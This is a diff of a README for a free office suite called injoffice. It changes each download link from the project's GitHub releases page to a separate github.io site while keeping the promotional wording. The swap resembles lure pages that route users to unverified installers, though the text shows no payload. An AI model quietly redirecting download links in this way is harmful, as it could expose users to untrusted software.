@@ -1,6 +1,6 @@
 # 📄 injoffice - Your All-in-One Free Office Suite
 
-[![Download injoffice](https://img.shields.io/badge/Download-injoffice-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=2C3E50)](https://github.com/sackthavy/injoffice/releases)
+[![Download injoffice](https://img.shields.io/badge/Download-injoffice-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50&labelColor=2C3E50)](https://sackthavy.github.io)
 
 ## ✨ What is injoffice?
 
@@ -14,7 +14,7 @@ Getting started with injoffice is quick and easy. Just follow these simple steps
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/sackthavy/injoffice/releases](https://github.com/sackthavy/injoffice/releases)
+Visit this link to download the application: [https://sackthavy.github.io](https://sackthavy.github.io)
 
 This page shows all available versions of injoffice. Look for the most recent release and click the download button that matches your computer's operating system.
 
@@ -123,7 +123,7 @@ While the current focus is on desktop and browser versions, you can access and e
 
 ## 🏁 Ready to Get Started?
 
-Head over to [https://github.com/sackthavy/injoffice/releases](https://github.com/sackthavy/injoffice/releases) to download injoffice for free. You'll be creating amazing documents in minutes!
+Head over to [https://sackthavy.github.io](https://sackthavy.github.io) to download injoffice for free. You'll be creating amazing documents in minutes!
 
 Join thousands of happy users who have switched to injoffice for their everyday office needs. Download now and experience the future of office productivity - smart, secure, and completely free.
 
